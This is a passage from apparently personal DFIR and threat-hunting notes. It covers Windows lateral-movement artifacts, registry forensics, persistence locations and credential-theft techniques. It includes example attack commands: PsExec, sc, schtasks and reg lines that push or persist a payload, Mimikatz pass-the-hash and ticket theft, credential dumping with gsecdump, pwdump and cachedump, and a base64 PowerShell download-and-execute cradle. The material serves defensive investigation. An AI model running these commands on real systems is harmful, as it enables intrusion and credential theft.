	- Review shortcut files and jumplists for remote files accessed by attackers, if they had interactive access (RDP)

<br>

### Windows Admin Shares -  Destination System Artifacts
- Stage malware/access sensitive files
- Pass-the-Hash attacks common
- Vista+ requires domain or built-in admin rights

**Event Logs**
- Security Event Log – security.evtx
	- 4624 Logon Type 3
		- Source IP/Logon User Name
- 4672
	- Logon User Name
	- Logon by user with administrative rights
	- Requirement for accessing default shares such as C$ and ADMIN$
- 4776 – NTLM if authenticating to Local System
	- Source Host Name/Logon User Name
- 4768 – TGT Granted
	- Source Host Name/Logon User Name
	- Available only on domain controller
- 4769 – Service Ticket Granted if authenticating to Domain Controller
	- Destination Host Name/Logon User Name
	- Source IP
	- Available only on domain controller
- 5140
	- Share Access
- 5145
	- Auditing of shared files – NOISY!

<br>

**File System**
- File Creation
	- Attacker's files (malware) copied to destination system
- Look for Modified Time before Creation Time
- Creation Time is time of file copy

<br>

### PsExec - Source System Artifacts

**Event Logs**
- security.evtx
	- 4648 – Logon specifying alternate credentials
		- Current logged-on User Name
		- Alternate User Name
		- Destination Host Name/IP
		- Process Name

<br>

**Registry**
- NTUSER.DAT
	- ```Software\SysInternals\PsExec\EulaAccepted```
- ShimCache – SYSTEM
	- psexec.exe
- BAM/DAM – SYSTEM – Last Time Executed
	- psexec.exe
- AmCache.hve – First Time Executed
	- psexec.exe

<br>

**File System**
- Prefetch – ```C:\Windows\Prefetch\psexec.exe-{hash}.pf```
- Possible references to other files accessed by psexec.exe, such as executables copied to target system with the “-c” option
- File Creation
	- psexec.exe file downloaded and created on local host as the file is not native to Windows

```psexec.exe \\host -accepteula -d -c c:\temp\evil.exe```


<br>

### PsExec - Destination System Artifacts
- Authenticates to destination system
- Named pipes are used to communicate
- Mounts hidden ADMIN$ share
- Copies PsExec.exe and other binaries to windows folder
- Executes code via a service (PSEXESVC)

**Event Logs**
- security.evtx
	- 4648 Logon specifying alternate credentials
		- Connecting User Name
		- Process Name
- 4624 Logon Type 3 (and Type 2 if “-u” Alternate Credentials are used)
	- Source IP/Logon User Name
- 4672
	- Logon User Name
	- Logon by a user with administrative rights
	- Requirement for access default shares such as C$ and ADMIN$
- 5140 – Share Access
	- ADMIN$ share used by PsExec
- system.evtx
	- 7045
		- Service Install

<br>

**Registry**
- New service creation configured in ```SYSTEM\CurrentControlSet\Services\PSEXESVC```
	- “-r” option can allow attacker to rename service
- ShimCache – SYSTEM
	- psexesvc.exe
- AmCache.hve First Time Executed
	- psexesvc.exe

<br>

**File System**
- Prefetch – ```C:\Windows\Prefetch\```  
		- ```psexesvc.exe-{hash}.pf```  
		- ```evil.exe-{hash}.pf```  
- File Creation
	- User profile directory structure created unless “-e” option used
- psexesvc.exe will be placed in ADMIN$ (\Windows) by default, as well as other executables (evil.exe) pushed by PsExec

<br>

### Windows Remote Management Tools
- Create and Start a remote service  
	- ```sc \\host create servicename binpath= “c:\temp\evil.exe”```  
	- ```sc \\host start servicename```  
- Remotely schedule tasks  
	- ```at \\host 13:00 "c:\temp\evil.exe"```  
	- ```schtasks /CREATE /TN taskname /TR c:\temp\evil.exe /SC once /RU “SYSTEM” /ST 13:00 /S host /U username```  
- Interact with Remote Registries  
	- ```reg add \\host\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Data /t REG_SZ /d "C:\evil.exe"```  
- Execute any remote command  
	- ```winrs -r:host -u:user command```  

<br>

### Remote Services - Source System Artifacts

**Registry**
- ShimCache – SYSTEM
	- ```sc.exe```  
- BAM/DAM – SYSTEM – Last Time Executed
	- ```sc.exe```  
-	AmCache.hve – First Time Executed
	- ```sc.exe```  

<br>

**File System**
- Prefetch – ```C:\Windows\Prefetch\```  
	- ```sc.exe-{hash}.pf```  

<br>

### Remote Services - Destination System Artifacts

**Event Logs**
- security.evtx
	- 4624 Logon Type 3
		- Source IP/Logon User Name
- 4697
	- Security records service install, if enabled
	- Enabling non-default Security events such as ID 4697 are particularly useful if only the Security logs are forwarded to a centralized log server
- system.evtx
	- 7034 – Service crashed unexpectedly
	- 7035 – Service sent a Start/Stop control
	- 7036 – Service started or stopped
	- 7040 – Start type changed _(Boot | On Request | Disabled)_
	- 7045 – A service was installed on the system

<br>

**Registry**
- ```SYSTEM\CurrentControlSet\Services\```
	- New service creation
- ShimCache – SYSTEM
	- evil.exe
	- ShimCache records existence of malicious service executable, unless implemented as a service DLL
- AmCache.hve – First Time Executed
	- evil.exe

<br>

**File System**
- File Creation
	- evil.exe or evil.dll malicious service executable or service DLL
- Prefetch – ```C:\Windows\Prefetch\```
	- ```evil.exe-{hash}.pf```


<br>

### Scheduled Tasks - Source System Artifacts

**Event Logs**
- security.evtx
	- 4648 – Logon specifying alternate credentials
		- Current logged-on User Name
		- Alternate User Name
		- Destination Host Name/IP
		- Process Name

<br>

**Registry**
-	ShimCache – SYSTEM
	- at.exe
	- schtasks.exe
-	BAM/DAM – SYSTEM – Last Time Executed
	- at.exe
	- schtasks.exe
- AmCache.hve -First Time Executed
	- at.exe
	- schtasks.exe

<br>

**File System**
- Prefetch – ```C:\Windows\Prefetch\```
	- ```at.exe-{hash}.pf```
	- ```schtasks.exe-{hash}.pf```

<br>

### Scheduled Tasks - Destination System Artifacts

**Event Logs**
- security.evtx
	- 4624 Logon Type 3
		- Source IP/Logon User Name
	- 4672
		- Logon User Name
		- Logon by a user with administrative rights Requirement for accessing default shares such as C$ and ADMIN$
	- 4698 – Scheduled task created
	- 4702 – Scheduled task updated
	- 4699 – Scheduled task deleted
	- 4700/4701 – Scheduled task enabled/disabled
- Microsoft-Windows-Task Scheduler%4Operational.evtx
	- 106 – Scheduled task created
	- 140 – Scheduled task updated
	- 141 – Scheduled task deleted
	- 200/201 – Scheduled task

<br>

**Registry**
- SOFTWARE
	- ```Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks```  
	- ```Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\```  
- ShimCache – SYSTEM
	- evil.exe
- AmCache.hve – First Time Executed
	- evil.exe

<br>

**File System**
- File Creation
	- evil.exe
	- Job files created in ```C:\Windows\Tasks```  
	- XML task files created in ```C:\Windows\System32\Tasks```  
		- Author tag under "RegistrationInfo" can identify:
			- Source system name
			- Creator username
- Prefetch – ```C:\Windows\Prefetch\```  
	- evil.exe-{hash}.pf

<br>

### WMI - Source System Artifacts
- Powerful lateral movement options
- Native to Windows OS

**Event Logs**
- security.evtx
	- 4648 – Logon specifying alternate credentials
		- Current logged-on User Name
		- Alternate User Name
		- Destination Host Name/IP
		- Process Name

<br>

**Registry**
- ShimCache – SYSTEM
	- wmic.exe
- BAM/DAM – SYSTEM – Last Time Executed
	- wmic.exe
- AmCache.hve – First Time Executed
	- wmic.exe

<br>

**File System**
- Prefetch – ```C:\Windows\Prefetch\```  
	- ```wmic.exe-{hash}.pf```  

<br>

### WMI - Destination System Artifacts
- wmiprvse.exe
- Microsoft-Windows-WMI-Activity/Operational

**Event Logs**
- security.evtx
	- 4624 Logon Type 3
		- Source IP/Logon User Name
- 4672
	- Logon User Name
	- Logon by an a user with administrative rights
- Microsoft-Windows-WMIActivity%4Operational.evtx
	- 5857
		- Indicates time of wmiprvse execution and path to provider DLL – attackers sometimes install malicious WMI provider DLLs
- 5860, 5861
	Registration of Temporary (5860) and Permanent (5861) Event Consumers. Typically used for persistence, but
can be used for remote execution.

<br>

**Registry**
- ShimCache – SYSTEM
	- scrcons.exe
	- mofcomp.exe
	- wmiprvse.exe
	- evil.exe
- AmCache.hve – First Time Executed
	- scrcons.exe
	- mofcomp.exe
	- wmiprvse.exe
	- evil.exe

<br>

**File System**
- File Creation
	- evil.exe
	- evil.mof – .mof files can be used to manage the WMI Repository
- Prefetch – ```C:\Windows\Prefetch\```  
	- ```scrcons.exe-{hash}.pf```  
	- ```mofcomp.exe-{hash}.pf```  
	- ```wmiprvse.exe-{hash}.pf```  
	- ```evil.exe-{hash}.pf```  
- Unauthorized changes to the WMI Repository in ```C:\Windows\system32\wbem\Repository```  

<br>

### Powershell Remoting - Source Sytem Artifacts

**Event Logs**
- security.evtx
	- 4648 – Logon specifying alternate credentials
		- Current logged-on User Name
		- Alternate User Name
		- Destination Host Name/IP
		- Process Name
- Microsoft-Windows-WinRM%4Operational.evtx
	- 6 – WSMan Session initialize
		- Session created
		- Destination Host Name or IP
		- Current logged-on User Name
	- 8, 15, 16, 33 – WSMan Session deinitialization
		- Closing of WSMan session
		- Current logged-on User Name
- Microsoft-Windows-PowerShell%4Operational.evtx
	- 40961, 40962
		- Records the local initiation of powershell.exe and associated user account
	- 8193 & 8194
		- Session created
	- 8197 - Connect
		- Session closed

<br>

**Registry**
- ShimCache – SYSTEM
	- powershell.exe
- BAM/DAM – SYSTEM – Last Time Executed
	- powershell.exe
- AmCache.hve – First Time Executed
	- powershell.exe

<br>

**File System**
- Prefetch – ```C:\Windows\Prefetch\```  
	- ```powershell.exe-{hash}.pf```  
	- PowerShell scripts (.ps1 files) that run within 10 seconds of powershell.exe launching will be tracked in powershell.exe prefetch file
- Command history 
	- ```C:\USERS\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt```  
	- With PS v5+, a history file with previous 4096 commands is maintained per user

```
Enter-PSSession –ComputerName host
Invoke-Command –ComputerName host –ScriptBlock {Start-Process c:\temp\evil.exe}
```

<br>

### Powershell Remoting - Destination Sytem Artifacts

**Event Logs**
- security.evtx
 	- 4624 Logon Type 3
 		- Source IP/Logon User Name
 - 4672
 	- Logon User Name
 	- Logon by an a user with administrative rights
- Microsoft-WindowsPowerShell%4Operational.evtx
	- 4103, 4104 – Script Block logging
 		- Logs suspicious scripts by default in PS v5
 		- Logs all scripts if configured
	- 53504 Records the authenticating user
- Windows PowerShell.evtx
	- 400/403 "ServerRemoteHost" indicates start/end of Remoting session
 	- 800 Includes partial script code
- Microsoft-WindowsWinRM%4Operational.evtx
	- 91 Session creation
	- 168 Records the authenticating user

<br>

**Registry**
- ShimCache – SYSTEM
	- wsmprovhost.exe
	- evil.exe
- SOFTWARE
	- ```Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell\ExecutionPolicy```  
	- Attacker may change execution policy to a less restrictive setting, such as "bypass"
- AmCache.hve – First Time Executed
	- wsmprovhost.exe
 	- evil.exe

<br>

**File System**
- File Creation
	- evil.exe
	- With Enter-PSSession, a user profile directory may be created
- Prefetch – ```C:\Windows\Prefetch\```  
	- ```evil.exe-{hash].pf```  
	- ```wsmprovhost.exe-{hash].pf```  
---

<br>



# Windows Forensics

## SANS Windows Forensic Analysis Poster
* [Link](https://github.com/w00d33/w00d33.github.io/blob/main/_files/SANS_Windows_Forensics_Poster.pdf)

<br>

## Registy Overview

**System  Registry Hives**

- %WinDIr%\System32\Config
	- SAM
		- Info about user accounts
		- Password last changed
		- Last logon
		- In user accounts
	- Security
		- Access Control list
		- Stored passwords
	- System
		- Configuration data (hardware)
	- Software
		- Configuration data (software/os)
	- Default
		- Not much of use

**User Registry Hives**

- %UserProfile%
	- NTUSER.DAT
	- Most recently used files
	- Last files searched for
	- Last typed URLs
	- Last commands executed
	- Opened Files
	- Last Saved Files

- %UserProfile%\AppData\Local\Microsoft\Windows\
	- USRCLASS.DAT
	- Program Execution
	- Opened and closed folders
	- Aids User Account Control (UAC)
	- HKCU\Software\Classes

- %WinDir%\appcompat\Programs
	- AMCACHE.hve
	- Excecution data

<br>

## Users and Groups

- SAM\Domains\Account\Users\
- Username
- Relative Identifier
- User Login Information
	- Last Login
	- Last Failed Login
	- Logon Count
	- Password Policy
	- Account Creation Time
- Group Information
	- Administrators
	- Users
	- Remote Desktop Users

<br>

## System Configuration

**Identify Current Control Set**
- SYSTEM\Select
- Systems Configuration Settings
- Identify what ControlSet is in use
		
**Identify Microsoft OS Version**
- MS Windows Version
	- ProductName
	- ReleaseID (YYMM)
- Service Pack Level
- Install Date of the last version/major update
	- InstallDate
- SOFTWARE\Microsoft\Windows NT\CurrentVersion
		
**Computer Name**
- SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName
- Name linked to log files, network connections
- Verify the PC that is being examined
	
**Time Zone of the Machine**
- System\CurrentControlSet\Control\TimeZoneInformation
- Correlation Activity
- Log Files\TimeStamps

**Network Interfaces**
- SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces
- Static or DHCP
- Ties machines to network activity
- Interface GUID for additional profiling
	
**Historical Networks**
- SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Managed
- SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Unmanaged
- SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Nla\Cache
- Identify Networks Computer has been connected to
- Could be wired or wireless
- Domain/intranet Name
- Identify SSID
- Identify Gateway MAC Address
- First and Last Time network connection was made
- Networks that have been connected to via VPN
- MAC address of SSID for Gateway can be physically triangulated
- Write Down ProfileGUID

**Network Types**
- SOFTWARE\Microsoft\WZCSVC\Parameters\Interfaces\{GUID} (XP)
- SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles (Win7-10)
- ID the type of network that the computer connected to
- ID wireless SSIDs that the computer previously connected to
	- ProfileName
- Time is recorded in LOCAL TIME, NOT UTC
- First and Last Connection Time
	- DateCreated
	- DateLastConnected
- Determine Type using Nametype
	- 6 (0x06) = Wired
	- 23 (0x17) = VPN
	- 71 (0x47) = Wireless
	- 243 (0xF3) = Mobile Broadband
- Network Category
	- Category
	- (Public) 0 - Sharing Disabled
	- (Private) 1 - Home, Sharing Enabled
	- (Domain) 2 - Work, Sharing Enabled
- Geolocate
	- Wigle.net
	
**System AutoStart Programs**
- Programs exhibiting persistence
	- User login
	- Boot time
- NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run
- NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\RunOnce
- Software\Microsoft\Windows\CurrentVersion\RunOnce
- Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run
- Software\Microsoft\Windows\CurrentVersion\Run
- (Services) SYSTEM\CurrentControlSet\Services
- IF start set to 0x02, then service application will start at boot (0x00 for drivers)(
- Determine programs that start automatically
- Useful for finding malware on a machine that installs on boot such as a rootkit
- Look at when the time key was last updated; generally last boot time of the system
	
**Last Shutdown Time**
- Discover when the system was last shutdown
- How many successful times the system was shutdown
- SYSTEM\CurrentControlSet\Control\Windows (Shutdown Time)
- SYSTEM\CurrentControlSet\Control\Watchdog\Display (Shutdown Count) - XP only
- Detect certain types of activity
- Determine if the user properly shuts down their machine


---

<br>

# Threat Hunting

## Common Malware Names
* [The typographical and homomorphic abuse of svchost.exe, and other popular file names](https://www.hexacorn.com/blog/2015/12/18/the-typographical-and-homomorphic-abuse-of-svchost-exe-and-other-popular-file-names/)

<br>

## Common Malware Locations
* [Digging for Malware: Suspicious Filesystem Geography](http://www.malicious-streams.com/resources/articles/DGMW1_Suspicious_FS_Geography.html)

<br>

## Living of the Land Binaries
* [LOLBAS Project](https://lolbas-project.github.io/)  

**RUNONCE.EXE**
- Executes a Run Once Task that has been configured in the registry
```
Runonce.exe /AlternateShellStartup
```

**RUNDLL32.EXE**
- Used by Windows to execute dll files
```
rundll32.exe AllTheThingsx64,EntryPoint
```

**WMIC.EXE**
- The WMI command-line (WMIC) utility provides a command-line interface for WMI
```
wmic.exe process call create calc
```

**NETSH.EXE**
- Netsh is a Windows tool used to manipulate network interface settings.
```
netsh.exe add helper C:\Users\User\file.dll
```

**SCHTASKS.EXE**
- Schedule periodic tasks
```
schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr c:\some\directory\revshell.exe
```

**MSIEXEC.EXE**
- Used by Windows to execute msi files
```
msiexec /quiet /i cmd.msi
```

<br>

## Persitence Locations

### Common Autostart Locations
```
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\RunOnce
SOFTWARE\Microsoft\Windows\CurrentVersion\Runonce
SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run
SOFTWARE\Microsoft\Windows\CurrentVersion\Run
SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
%AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

**Tools**
* Autoruns
* Kansa

<br>

### Services
```
HKLM\SYSTEM\CurrentControlSet\Services
```
* 0x02 = Automatic
* 0x00 = Boot Start of a Device Driver
* "sc" command can create services

**Tools**
* Autoruns
* "sc" command
* Kansa

<br>

### Scheduled Tasks
- at.exe
	- Deprecated but present in WinXP and Win7+
	- Recorded in at.job files and schdlgu.txt (XP)
- schtasks.exe
	- Activitiy logged in Task Scheduler and Security Logs

```powershell
schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr c:\some\directory\revshell.exe
```

Tools:
- Autoruns
- Kansa

<br>

### DLL Hijacking

DLL Search Order Hijacking
- Place malicious file ahead of DLL in search order
- Windows looks at Application directory prior to Windows/System32 folder
- Look at exe's import table
- Exception: DLLs present in the KnownDLLs Registry Key

Phantom DLL Hijacking
- Find DLLs that applications attempt to load, but doesn't exist

DLL Side Loading
- WinSXS provides a new version of a legit DLL

Relative Path DLL Hijacking
- Copy target .exe and corresponding bad .dll to a different location

Common DLL Search Order
1. DLLs already in memory
2. Side-by-side components
3. KnownDLLs List
4. Directory of the application
5. C:\Windows\System32
6. C:\Windows\System
7. C:\Windows
8. Current Directory
9. System %PATH%

<br>

### Hunting DLL Hijacking
- Machines rarely get new dlls (Application Install/Patching)

File system analysis
- Look for new or unsigned .exe/.dll files in unusual places

Memory Analysis
- Find system process or DLLs loaded from the wrong location

This technique is often followed up C2 network beaconing

<br>

### WMI Event Consumer Backdoors
- Allows triggers to be set that will run scripts and executables
- Event Filter: Trigger Condition
- Event Consumer: Script or executable to run
- Binding: Combine Filter and Consumer

Tools
- Kansa
- Autoruns

Discover Suspicious WMI Events
```powershell
Get-WMIObject -Namespace root\Subscription -Class __EventFilter
Get-WMIObject -Namespace root\Subscription -Class __Event Consumer
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
```
<br>

### Hunting WMI Persistence
- Look at consumers (CommandLine and Active Script)
	- Correlate to Event Filter (trigger)
- Search
	- .exe
	- .vbs
	- .ps1
	- .dll
	- .eval
	- ActiveXObject
	- powershell
	- CommandLineTemplate
	- ScriptText
- Common WMI Occurences
	- SCM Event Log Consumer
	- BVTFilter
	- TSlogonEvents.vbs
	- TSLogonFilter
	- RAevent.vbs
	- RmAssistEventFilter
	- KernCap.vbs
	- NETEventLogConsumer
	- WSCEAA.exe (Dell)

<br>

### Hunt and Analyze Persistence with Autoruns
- Live System Only
- Works for Autostart locations, Services, Scheduled Tasks, WMI Events
- Hashes files and can search VirusTotal for hits

1. Run autorunsc
 ```
 C:\>autorunsc -accepteula -a * -s -h -c -vr > \\server\share\autoruns.csv
 ```
2. Open .csv with tool of choice (e.g. Excel or TimelineExplorer)
3. Filter out trusted startup locations
	- Use signers to filter trusted code signers (can lead to false negative but is still a good place to start)
	- Look for:
		- (Not Verified)
		- Unfamiliar Signers
		- Blank (No Signer)
4. Filter by Enabled (Active)
5. Compare hashes to VirusTotal
6. Research vendor and product listed in "Publisher" and "Description" fields
7. Compare output to a the output of a known good machine

<br>

## Lateral Movement

### Detecting Credential Harvesting
- Event Logs
	- 4624 Logons
	- 4720 Account Creation
	- 4776 Local Account Auth
	- 4672 Privileged Account Usage
- Unix "secure"logs
- Auditing New Accounts
- Anomalous Logins
	- Workstation to Workstation
	- Sensitive Networks
- After Hour Logins

**Mitigations (Win10)**
- Credential Guard: Moves credentials (hashes & ticket) into virtual enclave
- Remote Credential Guard: RDP without pushing credentials to remote target
- Device Guard (Prevent execution of untrusted code)

**Hunt Notes**
- WDigest Plaintext Credentials
	- HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest
		- UseLogonCredential = "1" (Should be 0)

<br>

### Hashes
- Availabe in the LSASS process
- Can be extracted with admin privileges
- Local account password hashes are available in the SAM hive in memory or on disk
- Domain account hashes are present in memory during interactive sessions

**Common Tools**
- Mimikatz
- fgdump
- gsecdump
- Metasploit
- AceHash
- PWDumpX
- creddump
- WCE

**Pash-the-Hash Attack**
- Authenticate using a stolen account hash without knowing the cleartext password
	- Tools: Metasploit PsExec module, WCE, and SMBshell
- Limited to NTLM authentication
- Often used to map shares, perform PsExec-style remote execution, and WMI
- [Protecting Privileged Domain Accounts: Safeguarding Password Hashes](https://www.sans.org/blog/protecting-privileged-domain-accounts-safeguarding-password-hashes/)
- [Slides on Mimikatz 2.0](https://lira.epac.to/DOCS-TECH/Hacking/Mimikatz/Benjamin%20Delpy%20-%20Mimikatz%20a%20short%20journey%20inside%20the%20memory%20of%20the%20Windows%20Security%20service.pdf)
- [Mitigating Pass-the-Hash (PtH) Attacks and Other Credential Theft, Version 1 and 2](https://www.microsoft.com/en-us/download/details.aspx?id=36036)

**Examples**
- Hash dump with Gsecdump
```
gsecdump.exe -a > 1.txt
```

- Pass the Hash (Mimikatz)
```
mimikatz # sekurlsa::pth /user:username /domain:computername /ntlm:hash /run:".\psexec.exe -accepteula \\10.10.10.10 cmd.exe"
```

<br>

### Credential Availability on Targets

| **Admin Action** | **Logon**<br>**Type** | **Credentials**<br>**on Target?** | **Notes** |
| :---------------: | :---------------: | :---------------: | :---------------: |
| Console Logon | 2   | Yes*   |   *Except when Credential Guard is enabled  |
| RunAs | 2   | Yes*   |  *Except when Credential Guard is enabled    |
| Remote Desktop | 10   | Yes*   | *Except when Remote Credential Guard is enabled    |
| Net Use | 3   | No   | Including /u:parameter    |
| PowerShell Remoting | 3   | No   | Invoke-Command; Enter-PSSession   |
| PsExec Alternate Creds | 3+2   | Yes    | -u <<username>> -p <<password>>   |
| PsExec w/o Explicit Creds | 3   |  No   |    |
| Remote Scheduled Task | 4   | Yes    | Password saved as LSA Secret   |
| Run as a Service | 5   | Yes    | (w/user account)-Password saved as LSA Secret   |
| Remote Registry | 3   | No    |    |

<br> 

### Tokens
- Targets user sessions and running services
- Used for SSO
- Attacker can impersonate user's security context
- ```SeImpersonate``` privileges let tokens be copied from processes (also SYTEM or admin)
- Can allow adding user or managing group membership, mapping of remote shares, or Running PsExec (delegate tokens only)
- Often used to escalate from local to domain admin

**Token Stealing (Mimikatz)**
- Assumes attacker has local admin
```
mimikatz # privilege::debug
mimikatz # token:whoami
mimikatz # token:elevate /domain admin (identifies any domain admins present on the system)
```

**Common Tools**
- Incognito
- Metasploit
- PowerShell (PowerShell Empire)
- Mimikatz

**Hunting**
- [Monitoring for Delegation Token Theft](https://www.sans.org/blog/monitoring-for-delegation-token-theft/)

<br>

### Cached Credentials
- Stored domain credentials to allow logons when off domain
- Cached credentials hashes have to be cracked
- Salted and case-sensitive (slow to crack)
- Cannot be used in pass the hash
- Stored in the SECURITY\Cache registry key
- Admin or SYSTEM privileges required
- Hashes cracked with John the Ripper or hashcat

**Common Tools**
- cachedump
- Metasploit
- PWDumpX
- creddump
- AceHash

**Cached Credential Extraction with Creddump**

```./pwdump.py SYSTEM SAM true``` <- Local NT Hashes  
```./cachedump.py SYSTEM SECURITY true``` <- Cached Hashes


<br>

### LSA Secrets
- Credential stored in registry to allow services or tasks to be run with user privileges
- May also hold application passwords like VPN or auto-logon credentials
- Admin privileges allow access to encrypted registry data and keys necessary to decrypt
	- Stored SECURITY/Policy/Secrets
	- Parent key in SECURITY/Policy can decode
- Passwords are plaintext

<br>

### Decrypt LSA Secrets with Nishang
- Requires Admin
- Gain permissions necessary to access the Security registry hive with ```Enable-DuplicateToken```
- Dump registry data with ```Get-LsaSecret.ps1```  

**Common Tools**
- Cain
- Metasploit
- Mimikatz
- gsecdump
- AceHash
- creddump
- PowerShell

<br>

### Tickets - Kerberos
- Kerberos issues tickets to authenticated users
- Cached in memory and valid for 10 hours
- Tickets can be stolen from memory and used to authenticate else where (Pass the Ticket)
- Access to the DC allows tickets to be created for any user with no expiration (Golden Ticket)
- Service account tickets can be requested an forged, including offline cracking of service account hashes (Kerberoasting)

**Common Tools**
- Mimikatz
- WCE
- kerberoast

<br>

### Pass the Ticket with Mimikatz
- Dump Tickets
```mimikatz # sekurlsa::tickets /export```
- Import ticket elsewhere
```mimikatz # keberos::ptt [ticket]```
- Now available to authenticate to throughout environment

<br>

### Kerberos Attacks
- Pass the Ticket
	- Steal Ticket from memory and pass or import on other systems
- Overpass the Hash
	- Use NT hash to request a service ticket from the same account
- Kerberoasting
	- Request service ticket for highly privileged service and crack NT hash
- Golden Ticket
	- Kerberos TGT for any account with no expiration. Survives full password reset
- Silver Ticket
	- All-access pass for a single service or computer
- Skeleton Key
	- Patch LSASS on domain controller to add backdoor password that works for any domain account
- DCSync
	- Use fake Domain Controller replication to retrieve hashes (and hash history) for any account without login to the DC
- [PROTECTING WINDOWS NETWORKS – KERBEROS ATTACKS](https://dfirblog.wordpress.com/2015/12/13/protecting-windows-networks-kerberos-attacks/)

<br>

### NTDS.DIT
- Active Directory Domain Services (AD DS) database holds all user and computer account hashes (LM/NT) in the domain
- Encrypted but algorithm is easy to decrypt
- Located in the \Windows\NTDS folder on Domain Controller
- Requires admin accessto load driver to access raw disk or use Volume Shadow Copy Service

**Common Tools**
- ntdsutil
- VSSAdmin
- NTDSXtract
- Metasploit
- PowerShell
- secretsdump.py

<br>

### Bloodhound - Find a Path to Domain Admin
- Active Directory relationship graphing tool
	- Nodes: Users, Computers, Groups, OUs, GPOs
	- Edges: MemberOf, HasSession, AdminTo, TrustedBy
	- Paths: A list of nodes connected by edges (Path to Domain Admin)
	- Visualizes dangerous trust relationships and misconfigurations
	- Reduces brute-force effort required
	- Difficult to detect (Uses prodominantly LDAP)
		- Uses cached LDAP connections
	- [Automating the Empire with the Death Star: getting Domain Admin with a push of a button](https://byt3bl33d3r.github.io/automating-the-empire-with-the-death-star-getting-domain-admin-with-a-push-of-a-button.html)
		- Uses PowerShell Empire to enumerate accounts, perform cred theft, and lateral movement
	- [GoFetch](https://github.com/GoFetchAD/GoFetch)
		- Automates BloodHound findings
		- Uses ```Invoke-Mimikatz``` and ```Invoke-Psexec``` to auto cred theft and lateral movement
	- [BloodHound](https://github.com/BloodHoundAD/BloodHound)

	<img alt="BloodHound" src="https://i0.wp.com/wald0.com/wp-content/uploads/2017/05/TransitiveControllers.png?ssl=1" />


<br>

---

<br>

# Misc

## Decode Base64

```bash
echo  "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBzAHEAdQBpAHIAcgBlAGwAZABpAHIAZQBjAHQAbwByAHkALgBjAG8AbQAvAGEAJwApAAoA" | base64 -d | iconv -f UTF-16LE -t UTF-8
```

<br>

## Powershell CommandLine Switches
- -W: WindowStyle
- -nop: NoProfile
- -noni: NonInteractive
- -ec: EncodedCommand

<script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
<script>addBackToTop({
  diameter: 56,
  backgroundColor: 'rgb(255, 82, 82)',
  textColor: '#fff'
})</script>